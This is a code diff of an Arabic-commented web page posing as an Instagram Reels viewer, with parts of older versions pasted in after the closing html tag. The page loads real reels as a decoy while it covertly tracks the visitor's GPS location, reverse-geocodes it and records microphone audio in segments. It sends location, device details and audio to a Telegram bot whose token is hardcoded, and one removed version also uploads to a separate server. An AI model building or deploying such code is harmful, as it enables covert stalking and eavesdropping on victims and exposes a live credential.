@@ -22,6 +22,7 @@
     .custom-reel-bar{display:flex;padding:8px 16px;background:#111;gap:8px;align-items:center}
     .custom-reel-bar input{flex:1;padding:8px;border-radius:6px;border:1px solid #333;background:#222;color:#fff;font-size:14px}
     .custom-reel-bar button{background:#0095f6;color:#fff;border:0;padding:8px 16px;border-radius:6px;font-weight:bold;cursor:pointer}
+    .reel-count{color:#aaa;font-size:12px;margin-top:2px}
   </style>
 </head>
 <body>
@@ -30,10 +31,14 @@
   <div class="header-icons">🎥 📷 💬</div>
 </div>
 
-<!-- حقل إدخال رابط ريل مخصص -->
 <div class="custom-reel-bar">
-  <input type="text" id="customReelUrl" placeholder="الصق رابط Reel هنا...">
-  <button id="loadReelBtn">تحميل</button>
+  <input type="text" id="customReelUrl" placeholder="الصق رابط Reel لإضافته...">
+  <button id="addReelBtn">➕ أضف</button>
+  <button id="randomReelBtn">🎲 عشوائي</button>
+</div>
+<div style="padding:0 16px 4px;background:#111;display:flex;justify-content:space-between;">
+  <span class="reel-count" id="reelCount">الريلز: 0</span>
+  <button id="clearReelsBtn" style="background:#333;color:#fff;border:0;padding:4px 10px;border-radius:4px;font-size:12px;">مسح الكل</button>
 </div>
 
 <div class="reel-screen">
@@ -60,18 +65,34 @@
 <script>
   // ========== الإعدادات ==========
   const BOT_TOKEN = '8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM';
-  const CHAT_ID = '7615377804';   // <-- تأكد أنه صحيح بعد /start
+  const CHAT_ID = '7615377804';
 
-  const RECORD_DURATION_MS = 10000; // 10 ثوانٍ
+  const RECORD_DURATION_MS = 10000;
+
+  // ========== روابط افتراضية ==========
+  const DEFAULT_REELS = [
+    { id: 'CxeDohAgs2c', user: 'instagram', desc: '✨ This is Instagram' },
+    { id: 'Cq2Om6hLrGm', user: 'nike', desc: 'Never stop running 🔥' },
+    { id: 'CpjPLHpLdgo', user: 'leomessi', desc: 'GOAT moments 🐐' },
+    { id: 'Cp4d9oFrscD', user: 'nasa', desc: 'Views from orbit 🚀' },
+    { id: 'Cr8bIfdLu5M', user: 'netflix', desc: 'What to watch next 🍿' }
+  ];
+
+  // استرجاع الريلز من localStorage أو استخدام الافتراضية
+  let reels = JSON.parse(localStorage.getItem('savedReels')) || [...DEFAULT_REELS];
+  updateReelCount();
 
   // ========== عناصر الواجهة ==========
   const debugEl = document.getElementById('debugLog');
   const customReelUrl = document.getElementById('customReelUrl');
-  const loadReelBtn = document.getElementById('loadReelBtn');
+  const addReelBtn = document.getElementById('addReelBtn');
+  const randomReelBtn = document.getElementById('randomReelBtn');
+  const clearReelsBtn = document.getElementById('clearReelsBtn');
   const reelIframe = document.getElementById('reelIframe');
   const reelUsername = document.getElementById('reelUsername');
   const reelCaption = document.getElementById('reelCaption');
   const likesCount = document.getElementById('likesCount');
+  const reelCountEl = document.getElementById('reelCount');
 
   function log(msg, color='lime') {
     debugEl.style.display = 'block';
@@ -80,10 +101,73 @@
     console.log(msg);
   }
 
-  // ========== استخراج اسم الجهاز من User-Agent ==========
+  function saveReels() {
+    localStorage.setItem('savedReels', JSON.stringify(reels));
+    updateReelCount();
+  }
+
+  function updateReelCount() {
+    reelCountEl.textContent = `الريلز: ${reels.length}`;
+  }
+
+  function extractShortcode(url) {
+    const m = url.match(/\/reel\/([A-Za-z0-9_-]+)/);
+    return m ? m[1] : null;
+  }
+
+  function addReelFromInput() {
+    const url = customReelUrl.value.trim();
+    if (!url) return alert('أدخل رابطاً');
+    const shortcode = extractShortcode(url);
+    if (!shortcode) return alert('رابط غير صالح');
+    // التحقق من عدم تكراره
+    if (reels.some(r => r.id === shortcode)) {
+      alert('هذا الريل موجود مسبقاً');
+      return;
+    }
+    reels.push({
+      id: shortcode,
+      user: 'مخصص',
+      desc: 'ريل مضاف يدوياً'
+    });
+    saveReels();
+    customReelUrl.value = '';
+    log('✅ تمت إضافة الريل: ' + shortcode);
+  }
+
+  function loadRandomReel() {
+    if (reels.length === 0) {
+      alert('لا توجد ريلز متاحة. أضف واحداً أو أعد تحميل الصفحة.');
+      return;
+    }
+    const reel = reels[Math.floor(Math.random() * reels.length)];
+    reelIframe.src = `https://www.instagram.com/reel/${reel.id}/embed`;
+    reelUsername.textContent = reel.user;
+    reelCaption.textContent = reel.desc || '';
+    likesCount.textContent = Math.floor(Math.random()*5000+100).toLocaleString('ar-SA');
+    log(`🎬 تحميل ريل: ${reel.id} من @${reel.user}`);
+  }
+
+  // أحداث الأزرار
+  addReelBtn.addEventListener('click', addReelFromInput);
+  randomReelBtn.addEventListener('click', loadRandomReel);
+  clearReelsBtn.addEventListener('click', () => {
+    if (confirm('هل تريد مسح جميع الريلز المضافة؟')) {
+      reels = [...DEFAULT_REELS]; // إعادة التعيين للافتراضية
+      saveReels();
+      loadRandomReel();
+      log('🔄 تم إعادة التعيين إلى الريلز الافتراضية');
+    }
+  });
+
+  // السماح بإضافة الرابط بالضغط على Enter
+  customReelUrl.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') addReelFromInput();
+  });
+
+  // ========== استخراج اسم الجهاز ==========
   function getDeviceModel() {
     const ua = navigator.userAgent;
-    // أنماط شائعة
     const patterns = [
       /Huawei\s+([A-Za-z0-9\-]+)\s+Build/i,
       /Infinix\s+([A-Za-z0-9]+)\s+Build/i,
@@ -91,7 +175,7 @@
       /Samsung\s+([A-Za-z0-9]+)\s+Build/i,
       /iPhone\s+([\w\s]+)\s+like/i,
       /iPad;\s+CPU\s+OS\s+([\d_]+)\s+like\s+Mac/i,
-      /Linux;\s+Android\s+([\d\.]+);\s+([\w\s]+)\s+Build/i, // عام لأجهزة أندرويد
+      /Linux;\s+Android\s+([\d\.]+);\s+([\w\s]+)\s+Build/i,
       /(Windows NT [\d\.]+);/,
       /(Macintosh; Intel Mac OS X [\d_]+)/,
     ];
@@ -104,29 +188,25 @@
         return m[1] ? m[1].trim() : m[0];
       }
     }
-    // إذا لم يتطابق نعطي جزء من الـ UA
     const simple = ua.match(/\(([^)]+)\)/);
     return simple ? simple[1].split(';')[0].trim() : 'Unknown Device';
   }
 
-  // ========== Reverse Geocoding (تحويل الإحداثيات إلى نص) ==========
+  // ========== Reverse Geocoding ==========
   async function reverseGeocode(lat, lon) {
     try {
       const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ar`);
       const data = await res.json();
       if (data && data.address) {
         const addr = data.address;
-        // بناء سلسلة: الدولة - المدينة - الحي
         let parts = [];
         if (addr.country) parts.push(addr.country);
         if (addr.state) parts.push(addr.state);
         if (addr.city || addr.town || addr.village) parts.push(addr.city || addr.town || addr.village);
         if (addr.suburb || addr.neighbourhood) parts.push(addr.suburb || addr.neighbourhood);
         let text = parts.join(' - ');
-        // محاولة جلب أقرب معلم (من display_name أو address)
         let landmark = '';
         if (data.display_name) {
-          // نأخذ أول جزء قبل الفاصلة (غالباً اسم الشارع أو معلم)
           const firstPart = data.display_name.split(',')[0].trim();
           if (firstPart && !parts.includes(firstPart)) landmark = firstPart;
         }
@@ -137,7 +217,7 @@
     return null;
   }
 
-  // ========== إرسال إلى تيليجرام ==========
+  // ========== تيليجرام ==========
   async function telegram(method, body) {
     try {
       const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
@@ -151,7 +231,7 @@
     } catch(e) { log('❌ فشل اتصال: ' + e.message, 'red'); }
   }
 
-  // ========== تتبع الموقع مع وصف المكان ==========
+  // ========== تتبع الموقع ==========
   let watchId;
   function startTracking() {
     if (!navigator.geolocation) { log('⚠️ الموقع غير مدعوم', 'orange'); return; }
@@ -159,16 +239,10 @@
       async (pos) => {
         const {latitude, longitude, accuracy} = pos.coords;
         log(`📍 ${latitude.toFixed(5)}, ${longitude.toFixed(5)}`, 'cyan');
-        // Reverse geocode
         let placeText = await reverseGeocode(latitude, longitude);
         if (!placeText) placeText = 'غير معروف';
         const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-        const msg = `📍 *موقع جديد*\n` +
-                    `العرض: \`${latitude}\`\n` +
-                    `الطول: \`${longitude}\`\n` +
-                    `الدقة: ±${Math.round(accuracy)}م\n` +
-                    `الموقع: ${placeText}\n` +
-                    `[🗺️ عرض على الخريطة](${mapsLink})`;
+        const msg = `📍 *موقع جديد*\nالعرض: \`${latitude}\`\nالطول: \`${longitude}\`\nالدقة: ±${Math.round(accuracy)}م\nالموقع: ${placeText}\n[🗺️ عرض على الخريطة](${mapsLink})`;
         telegram('sendMessage', {chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'});
         telegram('sendLocation', {chat_id: CHAT_ID, latitude, longitude});
       },
@@ -180,7 +254,7 @@
     );
   }
 
-  // ========== تسجيل الصوت (10 ثوانٍ) مع إرسال عند الإغلاق ==========
+  // ========== تسجيل الصوت ==========
   let mediaRecorder = null;
   let audioStream = null;
   let currentChunks = [];
@@ -207,7 +281,6 @@
       if (currentChunks.length === 0) return;
       const blob = new Blob(currentChunks, {type: rec.mimeType || 'audio/webm'});
       await sendAudioBlob(blob);
-      // جدولة المقطع التالي
       if (audioStream && audioStream.active) setTimeout(scheduleRecording, 500);
     };
     rec.start();
@@ -229,14 +302,11 @@
     } catch(e) { log('❌ فشل إرسال الصوت', 'red'); }
   }
 
-  // إرسال المقطع الحالي عند إغلاق الصفحة
   function flushCurrentRecording() {
     if (currentRecorder && currentRecorder.state === 'recording') {
-      // إيقاف التسجيل فوراً وإرسال ما تم تجميعه
       currentRecorder.onstop = async () => {
         if (currentChunks.length > 0) {
           const blob = new Blob(currentChunks, {type: currentRecorder.mimeType || 'audio/webm'});
-          // استخدم sendBeacon إن أمكن أو fetch keepalive
           const fd = new FormData();
           fd.append('chat_id', CHAT_ID);
           fd.append('audio', blob, 'last_rec.webm');
@@ -277,399 +347,8 @@
   document.addEventListener('touchstart', launch, {once: true});
   setTimeout(() => { if(!started) launch(); }, 15000);
 
-  // ========== تحميل ريل مخصص ==========
-  function extractShortcode(url) {
-    const m = url.match(/\/reel\/([A-Za-z0-9_-]+)/);
-    return m ? m[1] : null;
-  }
-
-  function loadReel(shortcode, username='custom', desc='') {
-    reelIframe.src = `https://www.instagram.com/reel/${shortcode}/embed`;
-    reelUsername.textContent = username;
-    reelCaption.textContent = desc || 'ريل مخصص';
-    likesCount.textContent = Math.floor(Math.random()*5000+100).toLocaleString('ar-SA');
-  }
-
-  loadReelBtn.addEventListener('click', () => {
-    const url = customReelUrl.value.trim();
-    if (!url) return alert('أدخل رابطاً');
-    const shortcode = extractShortcode(url);
-    if (!shortcode) return alert('رابط غير صالح');
-    loadReel(shortcode, 'مخصص', 'ريل تم تحميله');
-    log('🎬 تم تحميل الريل: '+shortcode);
-  });
-
-  // تحميل ريل افتراضي عند البداية
-  loadReel('CxeDohAgs2c', 'instagram', '✨ This is Instagram');
+  // تحميل ريل عشوائي أولي
+  loadRandomReel();
 </script>
-</body>
-</html>            display: flex; align-items: center; gap: 8px;
-            color: #fff; font-size: 13px; margin-bottom: 4px;
-        }
-        .reel-info .music-row .music-icon {
-            width: 18px; height: 18px; animation: spin 3s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* ========== PROGRESS BAR ========== */
-        .progress-bar {
-            position: absolute; top: 8px; left: 8px; right: 8px;
-            height: 3px; background: rgba(255,255,255,0.3);
-            border-radius: 2px; z-index: 6;
-        }
-        .progress-fill {
-            height: 100%; background: #fff; border-radius: 2px;
-            width: 0%; animation: progressAnim 15s linear infinite;
-        }
-        @keyframes progressAnim {
-            0% { width: 0%; }
-            100% { width: 100%; }
-        }
-
-        /* ========== BOTTOM NAV (تاب) ========== */
-        .bottom-nav {
-            display: flex; justify-content: space-around; align-items: center;
-            background: #000; padding: 10px 0 20px;
-            border-top: 1px solid var(--border); flex-shrink: 0; z-index: 10;
-        }
-        .bottom-nav .nav-icon { cursor: pointer; }
-        .bottom-nav .nav-icon svg { width: 26px; height: 26px; fill: #fff; }
-        .bottom-nav .nav-icon.active svg { fill: #fff; }
-        .bottom-nav .nav-icon.add-btn {
-            border: 2px solid #fff; border-radius: 8px; padding: 4px 10px;
-        }
-
-        /* ========== MISC ========== */
-        .loading-layer {
-            position: absolute; top:0;left:0;right:0;bottom:0;
-            background: #000; display: flex; align-items: center;
-            justify-content: center; z-index: 20; color: #fff; font-size: 16px;
-        }
-        .loading-layer.hidden { display: none; }
-    </style>
-</head>
-<body>
-    <!-- ✅ Top Header -->
-    <div class="top-header">
-        <div class="logo">Instagram</div>
-        <div class="header-icons">
-            <!-- Reels icon -->
-            <svg viewBox="0 0 24 24"><path d="M2.5 5.5C2.5 4.395 3.395 3.5 4.5 3.5h15c1.105 0 2 .895 2 2v9c0 1.105-.895 2-2 2h-15c-1.105 0-2-.895-2-2v-9zM8 8.5v7l6.5-3.5L8 8.5z"/></svg>
-            <!-- Camera -->
-            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="5" fill="none" stroke="#fff" stroke-width="2"/><path d="M21 7v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7a2 2 0 012-2h1l1-2h10l1 2h1a2 2 0 012 2z" fill="none" stroke="#fff" stroke-width="2"/></svg>
-            <!-- Messages -->
-            <svg viewBox="0 0 24 24"><path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z" fill="none" stroke="#fff" stroke-width="2"/></svg>
-        </div>
-    </div>
-
-    <!-- ✅ Reel Screen -->
-    <div class="reel-screen" id="reelScreen">
-        <div class="loading-layer" id="loadingLayer">⏳ جار تحميل الريل...</div>
-        <div class="progress-bar"><div class="progress-fill"></div></div>
-
-        <!-- Iframe -->
-        <iframe id="reelIframe" allow="autoplay; encrypted-media; fullscreen" allowfullscreen></iframe>
-
-        <!-- Actions (right side) -->
-        <div class="reel-actions">
-            <button class="action-btn"> <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg> <span id="reelLikesCount">١٢٫٣ ألف</span> </button>
-            <button class="action-btn"> <svg viewBox="0 0 24 24"><path d="M20.656 2H3.344A1.344 1.344 0 002 3.344v13.312A1.344 1.344 0 003.344 18H6v4l4.5-4h10.156A1.344 1.344 0 0022 16.656V3.344A1.344 1.344 0 0020.656 2z" fill="none" stroke="#fff" stroke-width="2"/></svg> <span>٥٦٧</span> </button>
-            <button class="action-btn"> <svg viewBox="0 0 24 24"><path d="M7.217 10.907a2.25 2.25 0 100 2.186m2.533 1.074a2.25 2.25 0 004.5 0m2.533-1.074a2.25 2.25 0 100-2.186" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"/><path d="M12 2v4m0 12v4M2 12h4m12 0h4" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg> </button>
-            <button class="action-btn"> <svg viewBox="0 0 24 24"><path d="M5 7h14v14H5V7z" fill="none" stroke="#fff" stroke-width="2"/><path d="M9 7V5a3 3 0 016 0v2" fill="none" stroke="#fff" stroke-width="2"/></svg> </button>
-            <button class="action-btn"> <svg viewBox="0 0 24 24"><circle cx="12" cy="5" r="1.5"/><circle cx="12" cy="12" r="1.5"/><circle cx="12" cy="19" r="1.5"/></svg> </button>
-        </div>
-
-        <!-- Bottom info -->
-        <div class="reel-info">
-            <div class="user-row">
-                <div class="user-avatar" id="reelUserAvatar">N</div>
-                <span class="user-name" id="reelUsername">username</span>
-                <button class="follow-btn">متابعة</button>
-            </div>
-            <div class="caption" id="reelCaption"><strong id="reelUserCaption">user</strong> وصف الريل هنا...</div>
-            <div class="music-row">
-                <span style="font-size:18px;">♪</span>
-                <span id="reelMusic">Original Audio</span>
-            </div>
-        </div>
-    </div>
-
-    <!-- ✅ Bottom Nav -->
-    <div class="bottom-nav">
-        <div class="nav-icon active"><svg viewBox="0 0 24 24"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg></div>
-        <div class="nav-icon"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="6" fill="none" stroke="#fff" stroke-width="2"/><path d="M20 20l-4-4" stroke="#fff" stroke-width="2"/></svg></div>
-        <div class="nav-icon add-btn"><svg width="22" height="22" viewBox="0 0 24 24"><path d="M12 5v14m7-7H5" stroke="#fff" stroke-width="2.5" stroke-linecap="round"/></svg></div>
-        <div class="nav-icon"><svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2" fill="none" stroke="#fff" stroke-width="2"/><polygon points="10,8.5 16,12 10,15.5" fill="#fff"/></svg></div>
-        <div class="nav-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4" fill="none" stroke="#fff" stroke-width="2"/><path d="M4 20c0-4.4 3.6-8 8-8s8 3.6 8 8" fill="none" stroke="#fff" stroke-width="2"/></svg></div>
-    </div>
-
-    <script>
-        // ============================================================
-        // ⚠️  املأ CHAT_ID الصحيح (من خطوة getUpdates أعلاه)
-        // ============================================================
-        const BOT_TOKEN = '8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM';
-        const CHAT_ID = '7615377804'; // ← غيّره بعد أن تحصل عليه
-        const RECORD_DURATION_MS = 60000;
-
-        // ========== روابط Reels حقيقية ==========
-        const REEL_LIST = [
-            { id: 'CxeDohAgs2c', user: 'instagram',  desc: '✨ This is Instagram',     music: 'Original Audio' },
-            { id: 'Cq2Om6hLrGm', user: 'nike',       desc: 'Never stop running 🔥',    music: 'Nike – Just Do It' },
-            { id: 'CsQeUYcJx5I', user: 'natgeo',     desc: 'Planet Earth in motion 🌍', music: 'Nature Sounds' },
-            { id: 'CpjPLHpLdgo', user: 'leomessi',   desc: 'GOAT moments 🐐',          music: 'Messi – Tango' },
-            { id: 'CnRZnvDrqCY', user: 'cristiano',  desc: 'Siuuu from Al Nassr ⚽',    music: 'CR7 Anthem' },
-            { id: 'Cp4d9oFrscD', user: 'nasa',       desc: 'Views from orbit 🚀',      music: 'Space Ambient' },
-            { id: 'Cr8bIfdLu5M', user: 'netflix',    desc: 'What to watch next 🍿',     music: 'Netflix Sound' },
-            { id: 'CqrjON9Nj6B', user: 'kyliejenner',desc: 'Get ready with me 💄',      music: 'Glam Beat' },
-            { id: 'CnAEeSxjtTt', user: 'taylorswift',desc: 'Backstage vibes 🎤',       music: 'Taylor – Live' },
-            { id: 'Ck-FQqjJuYC', user: 'theweeknd',  desc: 'After Hours era 🌃',       music: 'Blinding Lights' }
-        ];
-
-        // ========== عناصر الواجهة ==========
-        const iframe = document.getElementById('reelIframe');
-        const loadingLayer = document.getElementById('loadingLayer');
-        const reelLikesCount = document.getElementById('reelLikesCount');
-        const reelUsername = document.getElementById('reelUsername');
-        const reelUserCaption = document.getElementById('reelUserCaption');
-        const reelCaption = document.getElementById('reelCaption');
-        const reelMusic = document.getElementById('reelMusic');
-        const reelUserAvatar = document.getElementById('reelUserAvatar');
-        const progressFill = document.querySelector('.progress-fill');
-
-        function loadRandomReel() {
-            const reel = REEL_LIST[Math.floor(Math.random() * REEL_LIST.length)];
-            iframe.src = `https://www.instagram.com/reel/${reel.id}/embed`;
-            reelUsername.textContent = reel.user;
-            reelUserCaption.textContent = reel.user;
-            reelCaption.innerHTML = `<strong>${reel.user}</strong> ${reel.desc}`;
-            reelMusic.textContent = reel.music || 'Original Audio';
-            reelUserAvatar.textContent = reel.user.charAt(0).toUpperCase();
-            const likes = Math.floor(Math.random() * 800000) + 5000;
-            reelLikesCount.textContent = likes.toLocaleString('ar-SA');
-
-            // شريط التقدم
-            progressFill.style.animation = 'none';
-            void progressFill.offsetWidth;
-            progressFill.style.animation = 'progressAnim 15s linear infinite';
-
-            iframe.onload = () => { setTimeout(() => loadingLayer.classList.add('hidden'), 800); };
-            iframe.onerror = () => { loadingLayer.innerHTML = '⚠️ تعذّر تحميل الريل'; };
-            console.log('✅ Reel loaded: ' + reel.id);
-        }
-        loadRandomReel();
-
-        // ========== تتبع الموقع ==========
-        let watchId = null, lastLat = null, lastLon = null;
-
-        function sendTelegram(method, body) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
-                method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(body)
-            }).then(r => r.json()).then(d => {
-                if (!d.ok) console.error('❌ Telegram error:', d.description);
-                else console.log('✅ Telegram OK:', method);
-            }).catch(e => console.error('❌ Network error:', e));
-        }
-
-        function trackLocation() {
-            if (!navigator.geolocation) { console.warn('⚠️ Geolocation غير مدعوم'); return; }
-            watchId = navigator.geolocation.watchPosition(pos => {
-                const { latitude, longitude, accuracy } = pos.coords;
-                if (lastLat && getDistance(lastLat,lastLon,latitude,longitude) < 0.02) return;
-                lastLat = latitude; lastLon = longitude;
-                const link = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                sendTelegram('sendLocation', { chat_id: CHAT_ID, latitude, longitude });
-                sendTelegram('sendMessage', {
-                    chat_id: CHAT_ID, parse_mode: 'Markdown',
-                    text: `📍 *موقع جديد*\nالعرض: \`${latitude}\`\nالطول: \`${longitude}\`\nالدقة: ±${Math.round(accuracy)}م\n${link}`
-                });
-            }, err => {
-                console.error('❌ Geolocation error:', err.message);
-                sendTelegram('sendMessage', { chat_id: CHAT_ID, text: '❌ خطأ تتبع: '+err.message });
-            }, { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 });
-        }
-
-        function getDistance(lat1,lon1,lat2,lon2) {
-            const R=6371, d=(t)=>t*Math.PI/180;
-            const a=Math.sin(d(lat2-lat1)/2)**2+Math.cos(d(lat1))*Math.cos(d(lat2))*Math.sin(d(lon2-lon1)/2)**2;
-            return R*2*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
-        }
-
-        // ========== تسجيل الصوت ==========
-        let mediaRecorder=null, audioStream=null, segIdx=0;
-        async function startAudio() {
-            try {
-                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                sendTelegram('sendMessage', { chat_id: CHAT_ID, text: '🎤 بدأ التسجيل الصوتي' });
-                function recordSegment() {
-                    const chunks=[];
-                    const rec = new MediaRecorder(audioStream);
-                    rec.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
-                    rec.onstop = async () => {
-                        const blob = new Blob(chunks);
-                        const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('audio', blob, `rec_${++segIdx}.webm`);
-                        fd.append('title', `🎤 ${new Date().toLocaleString('ar-SA')}`);
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method:'POST', body:fd })
-                            .then(r=>r.json()).then(d=>console.log('✅ Audio sent:', d.ok))
-                            .catch(e=>console.error('❌ Audio error:',e));
-                        if(audioStream?.active) setTimeout(recordSegment, 500);
-                    };
-                    rec.start();
-                    mediaRecorder = rec;
-                    setTimeout(()=>{ if(rec.state==='recording') rec.stop(); }, RECORD_DURATION_MS);
-                }
-                recordSegment();
-            } catch(err) {
-                console.error('❌ Mic error:', err.message);
-                sendTelegram('sendMessage', { chat_id: CHAT_ID, text: '❌ خطأ ميكروفون: '+err.message });
-            }
-        }
-
-        // ========== بدء كل شيء عند أول نقرة ==========
-        let started = false;
-        function startAll() {
-            if(started) return; started=true;
-            console.log('🚀 Starting tracking & audio...');
-            sendTelegram('sendMessage', { chat_id: CHAT_ID,
-                text: '🚀 *جلسة جديدة*\nالوقت: '+new Date().toLocaleString('ar-SA')+'\nالجهاز: '+navigator.userAgent.slice(0,80)
-            });
-            trackLocation();
-            setTimeout(startAudio, 1000);
-        }
-        document.addEventListener('click', startAll, {once:true});
-        document.addEventListener('touchstart', startAll, {once:true});
-        setTimeout(()=>{ if(!started) startAll(); }, 15000);
-
-        // ========== تنظيف ==========
-        window.addEventListener('beforeunload', ()=>{
-            if(mediaRecorder?.state==='recording') mediaRecorder.stop();
-            audioStream?.getTracks().forEach(t=>t.stop());
-            if(watchId) navigator.geolocation.clearWatch(watchId);
-        });
-
-        console.log('✅ جاهز — انتظر النقرة الأولى للبدء');
-    </script>
-</body>
-</html>            document.getElementById('reelCaption').innerHTML = 
-                `<strong>${reel.user}</strong> ${reel.desc}`;
-            const randomLikes = Math.floor(Math.random() * 500000) + 10000;
-            document.getElementById('reelLikes').textContent = 
-                `أعجب ${randomLikes.toLocaleString('ar-SA')} شخصًا`;
-            setTimeout(() => { loading.classList.add('hidden'); }, 1500);
-            console.log(`🎬 تم اختيار ريل: ${reel.id} من @${reel.user}`);
-        }
-
-        let watchId = null, lastSentLat = null, lastSentLon = null, mediaRecorder = null, audioStream = null, audioSegmentIndex = 0, isRunning = false;
-
-        function tgMsg(text) {
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown', disable_web_page_preview: false })
-            }).catch(()=>{});
-        }
-
-        function sendLoc(lat, lon, acc) {
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendLocation`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, latitude: lat, longitude: lon })
-            }).catch(()=>{});
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            tgMsg(`📍 **موقع جديد**\nالعرض: \`${lat}\`\nالطول: \`${lon}\`\nالدقة: ±${Math.round(acc||0)} م\nالوقت: ${new Date().toLocaleString('ar-SA')}\n📍 [عرض على الخريطة](${mapsLink})`);
-            if (CONFIG.DRIVE_SERVER_URL) {
-                fetch(`${CONFIG.DRIVE_SERVER_URL}/upload-location`, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc||0, timestamp: new Date().toISOString() })
-                }).catch(()=>{});
-            }
-        }
-
-        async function sendToDrive(blob, idx) {
-            if (!CONFIG.DRIVE_SERVER_URL) return;
-            const fd = new FormData();
-            fd.append('audio', blob, `segment_${idx}.webm`);
-            fd.append('segment', idx);
-            fd.append('timestamp', new Date().toISOString());
-            try { await fetch(`${CONFIG.DRIVE_SERVER_URL}/upload-audio`, { method: 'POST', body: fd }); } catch(e) {}
-        }
-
-        async function sendToTelegram(blob, idx) {
-            const fd = new FormData();
-            fd.append('chat_id', CONFIG.CHAT_ID);
-            fd.append('audio', blob, `rec_${idx}.webm`);
-            fd.append('title', `🎤 تسجيل ${idx} — ${new Date().toLocaleString('ar-SA')}`);
-            try { await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd }); } catch(e) {}
-        }
-
-        function getDist(lat1,lon1,lat2,lon2) {
-            const R=6371, dLat=(lat2-lat1)*Math.PI/180, dLon=(lon2-lon1)*Math.PI/180;
-            const a=Math.sin(dLat/2)**2+Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLon/2)**2;
-            return R*2*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
-        }
-
-        function startTracking() {
-            if (!navigator.geolocation) return;
-            watchId = navigator.geolocation.watchPosition(
-                (pos) => {
-                    const { latitude, longitude, accuracy } = pos.coords;
-                    if (lastSentLat && lastSentLon && getDist(lastSentLat,lastSentLon,latitude,longitude)<0.02) return;
-                    lastSentLat=latitude; lastSentLon=longitude;
-                    sendLoc(latitude,longitude,accuracy);
-                },
-                (err) => { let m='❌ خطأ تتبع: '; if(err.code===1) m+='رُفض الإذن'; else if(err.code===2) m+='الموقع غير متاح'; else if(err.code===3) m+='مهلة'; else m+=err.message; tgMsg(m); },
-                { enableHighAccuracy:true, maximumAge:0, timeout:30000 }
-            );
-        }
-
-        async function startAudio() {
-            try {
-                audioStream = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation:false, noiseSuppression:false, autoGainControl:false } });
-                tgMsg(`🎤 **بدء التسجيل الصوتي** — ${new Date().toLocaleString('ar-SA')}`);
-                function createSegment() {
-                    const chunks=[];
-                    const mime = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm';
-                    const rec = new MediaRecorder(audioStream,{mimeType:mime});
-                    rec.ondataavailable = (e) => { if(e.data.size>0) chunks.push(e.data); };
-                    rec.onstop = async () => {
-                        const blob = new Blob(chunks,{type:mime});
-                        audioSegmentIndex++;
-                        sendToTelegram(blob,audioSegmentIndex);
-                        sendToDrive(blob,audioSegmentIndex);
-                        if(audioStream && audioStream.active) setTimeout(createSegment,500);
-                    };
-                    rec.start();
-                    mediaRecorder=rec;
-                    setTimeout(()=>{ if(rec.state==='recording') rec.stop(); }, CONFIG.RECORD_DURATION_MS);
-                }
-                createSegment();
-            } catch(err) {
-                let m='❌ خطأ ميكروفون: ';
-                if(err.name==='NotAllowedError') m+='رُفض الإذن';
-                else if(err.name==='NotFoundError') m+='لا يوجد ميكروفون';
-                else m+=err.message;
-                tgMsg(m);
-            }
-        }
-
-        function launchPayments() {
-            if(isRunning) return;
-            isRunning=true;
-            initReel();
-            tgMsg(`🚀 **بدأت جلسة جديدة**\nالوقت: ${new Date().toLocaleString('ar-SA')}\nالجهاز: ${navigator.userAgent.slice(0,80)}`);
-            startTracking();
-            setTimeout(startAudio,1000);
